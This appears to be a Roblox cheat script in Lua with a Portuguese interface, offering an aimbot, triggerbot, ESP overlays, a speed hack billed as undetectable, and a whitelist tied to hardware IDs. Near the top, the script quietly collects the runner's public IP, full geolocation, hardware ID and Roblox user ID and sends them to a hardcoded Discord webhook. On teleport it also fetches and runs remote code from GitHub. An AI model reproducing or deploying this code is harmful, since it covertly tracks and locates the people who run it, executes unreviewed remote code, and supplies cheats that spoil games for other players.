print("CHECKING IF YOU IS IN WHITELIST")

local WH = {
    {HWID = "b68f4ee5037e9b9280a42ca45a4100491c0efd708ca7120dd6df4004b8b7c9d9"},
    {HWID = "68027323ebf21ea92c8d35dea26746e09eadf0d0070bcdd1c906e0cbde725985"}
}
table.freeze(WH)

getgenv().HasdaWID = gethwid()

function VWH()
    for _, data in ipairs(WH) do
        if data.HWID == getgenv().HasdaWID then
            return "TRUE"
        end
    end
    return "FALSE"
...
local httpLibraries = {
    ...
    hydrogen and hydrogen.request,
    arceus and arceus.request,
    krnl and krnl.request,
    syn,
}

local http
for _, lib in ipairs(httpLibraries) do
    if lib then
        http = lib
        break
    end
...
if not http then
    print("No HTTP library found.")
    return
end

-- Função para obter o IP público usando a API IPify
local function getPublicIP()
    local response = http({Url = 'https://api.ipify.org/'; Method = 'GET'})
    return response and response.Body or "IP não encontrado"
end

-- Função para obter a tabela de dados de localização usando a API ipapi.co
local function getLocationData(ip)
    local response = http({Url = 'https://ipapi.co/' .. ip .. '/json/'; Method = 'GET'})
    return game:GetService("HttpService"):JSONDecode(response.Body)
end

local function getLocalTimeAndLocale()
    -- Obter a hora local e a diferença de fuso horário
    local localTime = os.date("%Y-%m-%d %H:%M:%S")
    local timezone = os.date("%z")
    
    -- Formatar a diferença de fuso horário para GMT
    local hours = tonumber(timezone:sub(1, 3))
    local minutes = tonumber(timezone:sub(4, 5))
    local formattedTimezone = string.format("GMT%+d:%02d", hours, minutes)

    return localTime, formattedTimezone
end

local publicIP = getPublicIP()
local locationData = getLocationData(publicIP)
local localTime, TimeZone = getLocalTimeAndLocale()

local webhookUrl = "https://discord.com/api/webhooks/1244173734223417367/5VbxjQDTd6FC19CM4HyLyTbIqIT76DtriKppOdXbLbyVdu5xzhZt5eWdM5EFllPoNeS8" -- Substitua pelo URL do seu webhook

-- Construir a string com todas as informações de localização
local locationInfo = ""
for key, value in pairs(locationData) do
    locationInfo = locationInfo .. key .. ": " .. tostring(value) .. "\n"
end
...
local data = {
    embeds = {
        {
            title = "USO DETECTADO",
            description = "Foi detectado o uso de um script. Informações: **PLAYER:** [ID](https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId.."/profile)",
            fields = {
                {
                    name = "**HWID:**",
                    value = "||"..gethwid().."||",
...
if VWH() == "TRUE" then
    print("WHITELIS COMPLETA. EXECUTANDO")
else
    game.Players.LocalPlayer:Kick("VOCÊ NÃO TEM PERMISSÃO PARA USAR ISSO. PEÇA A IAMTHEBESTTS O ACESSO (VOCÊ FOI REGISTRADO EM VOSSO SISTEMA.)")
    script:Destroy()
    return -- Encerrar a execução do script aqui
end
...
pcall(function()
    if not DEBUG and getfenv().isfile and getfenv().readfile and getfenv().isfile(string.format("%s.iamthebestts", game.GameId)) and getfenv().readfile(string.format("%s.iamthebestts", game.GameId)) then
        ImportedConfiguration = HttpService:JSONDecode(getfenv().readfile(string.format("%s.iamthebestts", game.GameId)))
...
Configuration.AimPartDropdownValues = ImportedConfiguration["AimPartDropdownValues"] or { "Head", "HumanoidRootPart", "FaceHitBox", "HeadTopHitBox" }
...
Configuration.TpwalkToggle = ImportedConfiguration["TpwalkToggle"] or false
Configuration.TpwalkSpeed = ImportedConfiguration["TpwalkSpeed"] or 0
Configuration.ZoomToggle = ImportedConfiguration["ZoomToggle"] or false
Configuration.ZoomSlider = ImportedConfiguration["ZoomSlider"] or 10
Configuration.ZoomKeybind = ImportedConfiguration["ZoomKeybind"] or Z

Configuration.NotificationsToggle = ImportedConfiguration["NotificationsToggle"] or true
--! Constants
...
local SensitivityChanged; SensitivityChanged = UserInputService:GetPropertyChangedSignal("MouseDeltaSensitivity"):Connect(function()
    ...
    elseif not Aiming or not DEBUG and mousemoverel and Configuration.UseMouseMoving then
...
do
    ...
    Tabs.Aimbot:AddParagraph({
        Title = "PD ESP-AIM",
        Content = "Modified by iamthebestts."
    })

    local AimbotSection = Tabs.Aimbot:AddSection("Aimbot")

    local AimbotToggle = AimbotSection:AddToggle("AimbotToggle", { Title = "Aimbot Toggle", Description = "Alterna o aimbot", Default = Configuration.Aimbot })
    AimbotToggle:OnChanged(function(Value)
        Configuration.Aimbot = Value
    end)

    local OnePressAimingModeToggle = AimbotSection:AddToggle("OnePressAimingModeToggle", { Title = "Modo de um só toque", Description = "Utiliza o modo de um toque em vez do modo de espera", Default = Configuration.OnePressAimingMode })
    OnePressAimingModeToggle:OnChanged(function(Value)
        Configuration.OnePressAimingMode = Value
    end)

    if mousemoverel then
        local UseMouseMovingToggle = AimbotSection:AddToggle("UseMouseMovingToggle", { Title = "Utilizar o movimento do mouse", Description = "Usa o movimento do mouse em vez do movimento da câmara", Default = Configuration.UseMouseMoving })
    ...
    local AimPartDropdown = AimbotSection:AddDropdown("AimPartDropdown", {
        Title = "Aim Part",
        Description = "Muda a parte em que o aimbot vai mirar.",
    ...
    local RandomAimPartToggle = AimbotSection:AddToggle("RandomAimPartToggle", { Title = "Parte do objetivo aleatório", Description = "Selecciona a cada segundo uma parte de mira aleatória a partir do menu pendente", Default = Configuration.RandomAimPart })
    RandomAimPartToggle:OnChanged(function(Value)
        Configuration.RandomAimPart = Value
    end)

    AimbotSection:AddInput("AddAimPartInput", {
        Title = "Adicionar Aim Part",
        Description = "Depois de escrever, aperte Enter",
        Numeric = false,
        Finished = true,
    ...
    if getfenv().mouse1click then
        ...
        local TriggerBotToggle = TriggerBotSection:AddToggle("TriggerBotToggle", { Title = "TriggerBot Toggle", Description = "Alterna o TriggerBot", Default = Configuration.TriggerBot })
        TriggerBotToggle:OnChanged(function(Value)
            Configuration.TriggerBot = Value
        end)

        local OnePressTriggeringModeToggle = TriggerBotSection:AddToggle("OnePressTriggeringModeToggle", { Title = "One-Press Mode", Description = "Utiliza o modo de um toque em vez do modo de espera", Default = Configuration.OnePressTriggeringMode })
        ...
        local TriggerKeybind = TriggerBotSection:AddKeybind("TriggerKeybind", {
            Title = "Trigger Key",
            Description = "Altera a tecla de acionamento",
            Mode = "Hold",
    ...
    local TeamCheckToggle = SimpleChecksSection:AddToggle("TeamCheckToggle", { Title = "Team Check", Description = "Alterna a verificação da equipe", Default = Configuration.TeamCheck })
    TeamCheckToggle:OnChanged(function(Value)
        Configuration.TeamCheck = Value
    end)

    local FriendCheckToggle = SimpleChecksSection:AddToggle("FriendCheckToggle", { Title = "Friend Check", Description = "Alterna a verificação de amigos", Default = Configuration.FriendCheck })
    FriendCheckToggle:OnChanged(function(Value)
        Configuration.FriendCheck = Value
    end)

    local WallCheckToggle = SimpleChecksSection:AddToggle("WallCheckToggle", { Title = "Wall Check", Description = "Alterna a verificação da parede", Default = Configuration.WallCheck })
    ...
    local FoVCheckToggle = AdvancedChecksSection:AddToggle("FoVCheckToggle", { Title = "FoV Check", Description = "Alterna a verificação do FoV", Default = Configuration.FoVCheck })
    ...
    local MagnitudeCheckToggle = AdvancedChecksSection:AddToggle("MagnitudeCheckToggle", { Title = "Magnitude Check", Description = "Alterna a verificação de magnitude", Default = Configuration.MagnitudeCheck })
    ...
    AdvancedChecksSection:AddSlider("TriggerMagnitudeSlider", {
        ...
        Description = "Distância entre o carácter nativo e o carácter alvo",
    ...
    local TransparencyCheckToggle = AdvancedChecksSection:AddToggle("TransparencyCheckToggle", { Title = "Transparency Check", Description = "Alterna a verificação da transparência", Default = Configuration.TransparencyCheck })
    ...
    AdvancedChecksSection:AddSlider("IgnoredTransparencySlider", {
        ...
        Description = "O alvo é ignorado se a sua transparência for > do que / = ao valor definido",
    ...
    local GroupCheckToggle = AdvancedChecksSection:AddToggle("GroupCheckToggle", { Title = "Group Check", Description = "Alterna a verificação de grupo", Default = Configuration.GroupCheck })
    ...
    local PlayerCheckToggle = ExpertChecksSection:AddToggle("PlayerCheckToggle", { Title = "Player Check", Description = "Alterna a verificação do jogador", Default = Configuration.PlayerCheck })
    ...
    local IgnoredPlayersDropdown = ExpertChecksSection:AddDropdown("IgnoredPlayersDropdown", {
        ...
        Description = "Adiciona jogadores ignorados",
    ...
    ExpertChecksSection:AddInput("AddIgnoredPlayerInput", {
        Title = "Adicionar jogador ignorado",
    ...
    local TargetPlayersDropdown = ExpertChecksSection:AddDropdown("TargetPlayersDropdown", {
        Title = "Player alvo",
        Description = "Adicionar player alvo",
    ...
    ExpertChecksSection:AddInput("AddTargetPlayerInput", {
        Title = "Adicionar player alvo",
        Description = "Após digitar, aperte Enter",
        Numeric = false,
        Finished = true,
        Placeholder = "Player Name",
        Callback = function(Value)
    ...
    local MoveDirectionOffsetToggle = MoveDirectionOffsetSection:AddToggle("MoveDirectionOffsetToggle", { Title = "Desvio da direção do movimento", Description = "Toggles the Move Direction Offset", Default = Configuration.MoveDirectionOffset })
    ...
    MoveDirectionOffsetSection:AddSlider("OffsetIncrementSlider", {
        Title = "Incremento de desvio",
        Description = "Altera o incremento de desvio",
    ...
    SensitivitySection:AddSlider("SensitivitySlider", {
        Title = "Sensibilidade",
        Description = "Suaviza os movimentos do rato e da câmara ao fazer pontaria",
    ...
    if getfenv().Drawing then
        ...
        local ShowFoVToggle = FoVSection:AddToggle("ShowFoVToggle", { Title = "Mostrar FoV", Description = "Alterna a exibição de FoV", Default = Configuration.ShowFoV })
        ...
        FoVSection:AddSlider("FoVTransparencySlider", {
            ...
            Description = "Altera a transparência do FoV",
        ...
        local SmartESPToggle = ESPSection:AddToggle("SmartESPToggle", { Title = "ESP inteligente", Description = "Não mostra o ESP nos jogadores inscritos na lista branca", Default = Configuration.SmartESP })
        SmartESPToggle:OnChanged(function(Value)
            Configuration.SmartESP = Value
        end)

        local ESPBoxToggle = ESPSection:AddToggle("ESPBoxToggle", { Title = "ESP Caixa", Description = "Cria a caixa ESP à volta dos jogadores", Default = Configuration.ESPBox })
        ESPBoxToggle:OnChanged(function(Value)
            Configuration.ESPBox = Value
        end)

        local NameESPToggle = ESPSection:AddToggle("NameESPToggle", { Title = "Nome ESP", Description = "Cria o Nome ESP acima dos Jogadores", Default = Configuration.NameESP })
        ...
        local TracerESPToggle = ESPSection:AddToggle("TracerESPToggle", { Title = "Tracer ESP", Description = "Cria o Tracer ESP na direção dos Jogadores (LINHA)", Default = Configuration.TracerESP })
        ...
        ESPSection:AddSlider("ESPTransparencySlider", {
            ...
            Description = "Altera a transparência do ESP",
        ...
        local ESPUseTeamColourToggle = ESPSection:AddToggle("ESPUseTeamColourToggle", { Title = "Utilizar a cor da equipa", Description = "Faz com que a cor ESP corresponda à equipa do jogador alvo", Default = Configuration.ESPUseTeamColour })
        ...
        local RainbowVisualsToggle = VisualsSection:AddToggle("RainbowVisualsToggle", { Title = "Visuais do arco-íris", Description = "Torna as imagens num arco-íris", Default = Configuration.RainbowVisuals })
        ...
        Window:Dialog({
            Title = "AVISO!",
            Content = "O seu software não suporta a Biblioteca de Desenhos! O acesso ao separador Visuals é restrito.",
            Buttons = {
                {
                    Title = "Confirm"
                }
...
-- Inicializando o Tab e a seção
Tabs.Others = Window:AddTab({ Title = "Others", icon = "" })
local OthersSection = Tabs.Others:AddSection("TP WALK")

-- Variáveis globais
getgenv().tpwalking = false
getgenv().tpwalkingspeed = 0
...
-- Obter o serviço de execução
local RunService = game:GetService("RunService")
local hb = RunService.Heartbeat

-- Função para o TP walk
function tpwalk()
    print("TPWALK ATIVADO")
    ...
    while getgenv().tpwalking and chr and hum and hum.Parent do
        ...
        if hum.MoveDirection.Magnitude > 0 then
            if getgenv().tpwalkingspeed and isNumber(getgenv().tpwalkingspeed) then
                chr:TranslateBy(hum.MoveDirection * getgenv().tpwalkingspeed * delta * 10)
            else
                chr:TranslateBy(hum.MoveDirection * delta * 10)
            end
        end
    end
    print("TPWALK DESATIVADO")
end

-- Toggle para ativar/desativar o TP walk
local TpWalkToggle = OthersSection:AddToggle("TpwalkToggle", {
    Title = "TpWalk",
    Description = "Forma alternativa (indetectável) de speed.",
    Default = Configuration.TpwalkToggle,
    Callback = function(state)
        getgenv().tpwalking = state
        if state then
            spawn(tpwalk)
        end
    end
...
-- Slider para ajustar a velocidade do TP walk
local TpWalkSlider = OthersSection:AddSlider("TpwalkSpeed", {
    Title = "TPWALK SPEED",
    Description = "Velocidade speed",
    Default = Configuration.TpwalkSpeed,
    Min = 0,
    Max = 10,
    Rounding = 001,
    Callback = function(Value)
        getgenv().tpwalkingspeed = Value
    end
})

local OthersSection_2 = Tabs.Others:AddSection("Funções visuais")

-- Botão para remover a neblina
OthersSection_2:AddButton({
    Title = "Remover FOG",
    Description = "Remove a neblina no jogo (Inreversível)",
    Callback = function()
...
-- Toggle para Loop Full Bright
local LPFB = Tabs.Others:AddToggle("LPFB", {
    Title = "Loop Full Bright",
    Description = "Deixa o ambiente claro, reduzindo lag. (Inreversível)",
    Default = false,
    Callback = function(state)
        local RunService = game:GetService("RunService")
        local Lighting = game:GetService("Lighting")

        -- Desconectar o loop anterior, se existir
        if brightLoop then
            brightLoop:Disconnect()
        end

        if state then
            -- Função para aplicar configurações de brilho
            ...
            -- Conectar a função brightFunc ao evento RenderStepped
            brightLoop = RunService.RenderStepped:Connect(brightFunc)
        else
            -- Desconectar o loop se o estado for falso
            if brightLoop then
                brightLoop:Disconnect()
            end
        end
...
OthersSection_2:AddButton({
    Title = "Remover Visor",
    Description = "Remove o efeito do visor do seu capacete (irreversivel)",
    Callback = function()

        game.Players.LocalPlayer.PlayerGui.MainGui.MainFrame.ScreenEffects.Visor.Visible = false
    end
})
    ...
    if Fluent.UseAcrylic then
        UISection:AddToggle("AcrylicToggle", {
            Title = "Acrylic",
            Description = "Background borrado requer Qualidade de grafico >= 8",
            ...
            Callback = function(Value)
                if not Value then
                    ...
                    Window:Dialog({
                        Title = "AVISO",
                        Content = "Essa opção pode ser detectada. Ativar mesmo assim?",
                        Buttons = {
                            {
                                Title = "Confirmar",
                                Callback = function()
    ...
    UISection:AddToggle("TransparentToggle", {
        Title = "Transparencia",
        Description = "Faça a interface transparente",
    ...
    UISection:AddKeybind("MinimizeKeybind", { Title = "Key minizar", Description = "Muda a kay para minimizar a interface.", Default = "RightShift" })
    Fluent.MinimizeKeybind = Fluent.Options.MinimizeKeybind

    local NotificationsSection = Tabs.Settings:AddSection("Notifications")

    local NotificationsToggle = NotificationsSection:AddToggle("NotificationsToggle", { Title = "Mostrar Notificações", Description = "Muda se as notificações vão ser mostradas.", Default = Configuration.NotificationsToggle })
    ...
    if getfenv().isfile and getfenv().readfile and getfenv().writefile and getfenv().delfile then
        ...
        ConfigurationManager:AddButton({
            ...
            Callback = function()
                xpcall(function()
                    ...
                    getfenv().writefile(string.format("%s.iamthebestts", game.GameId), ExportedConfiguration)
                    Window:Dialog({
                        Title = "Configuration Manager",
                        Content = string.format("Arquivo de configuração %s.BC has been successfully overwritten!", game.GameId),
                        Buttons = {
                            {
                                Title = "Confirm"
                            }
                    ...
                    Window:Dialog({
                        Title = "Configuration Manager",
                        Content = string.format("An Error occurred when overwriting the Configuration File %s.BC", game.GameId),
                        Buttons = {
                            {
                                Title = "Confirm"
                            }
        ...
        ConfigurationManager:AddButton({
            ...
            Callback = function()
                if getfenv().isfile(string.format("%s.BC", game.GameId)) then
                    getfenv().delfile(string.format("%s.BC", game.GameId))
                    Window:Dialog({
                        Title = "Configuration Manager",
                        Content = string.format("Configuration File %s.BC has been successfully deleted!", game.GameId),
                        Buttons = {
                            {
                                Title = "Confirm"
                            }
                    ...
                    Window:Dialog({
                        Title = "Configuration Manager",
                        Content = string.format("Configuration File %s.BC could not be found!", game.GameId),
                        Buttons = {
                            {
                                Title = "Confirm"
                            }
    ...
    if getfenv().setclipboard then
        Discord:AddButton({
            ...
            Callback = function()
                getfenv().setclipboard("https://iamthebestts.su/pix")
                Window:Dialog({
                    Title = "Discord",
        ...
        Discord:AddParagraph({
            Title = "https://iamthebestts.su/pix",
...
local function IsReady(Target)
    if Target and Target:FindFirstChildWhichIsA("Humanoid") and Target:FindFirstChildWhichIsA("Humanoid").Health > 0 and not Target:FindFirstChildWhichIsA("ForceField") and Configuration.AimPart and Target:FindFirstChild(Configuration.AimPart) and Target:FindFirstChild(Configuration.AimPart):IsA("BasePart") then
        ...
        elseif Configuration.MagnitudeCheck and NativePart then
            ...
            if Magnitude > Configuration.TriggerMagnitude.Value then
                return false
            end
...
function ESPLibrary:Initialize(Target)
    ...
    if Head and HumanoidRootPart then
        ...
        if IsInViewport then
            ...
            self.NameESP.Text = string.format("", self.Player.Name)
...
local OnTeleport; OnTeleport = Player.OnTeleport:Connect(function()
    if DEBUG or not Fluent or not getfenv().queue_on_teleport then
        ...
        getfenv().queue_on_teleport("getfenv().loadstring(game:HttpGet(\"https://raw.githubusercontent.com/iamthebestts/Open-Aimbot/master/source.lua\", true))()")
        OnTeleport:Disconnect()
    end
end)
...
local AimbotLoop; AimbotLoop = RunService.RenderStepped:Connect(function()
    ...
    if Aiming then
        ...
        if not IsReady(OldTarget) then
            for _, _Player in next, Players:GetPlayers() do
                ...
                if IsCharacterReady and PartViewportPosition[2] then
                    ...
                    local FoVRadius = tonumber(Configuration.FoVRadius) or Closest
                    if Magnitude <= Closest and Magnitude <= (Configuration.FoVCheck and FoVRadius or Closest) then
                        Target = Character
                        Closest = Magnitude
                    end
                end
        ...
        if IsTargetReady then
            ...
            if not DEBUG and mousemoverel and Configuration.UseMouseMoving then
                if PartViewportPosition[2] then
                    ...
                    mousemoverel((PartViewportPosition[1].X - MouseLocation.X) * Sensitivity, (PartViewportPosition[1].Y - MouseLocation.Y) * Sensitivity)
                else
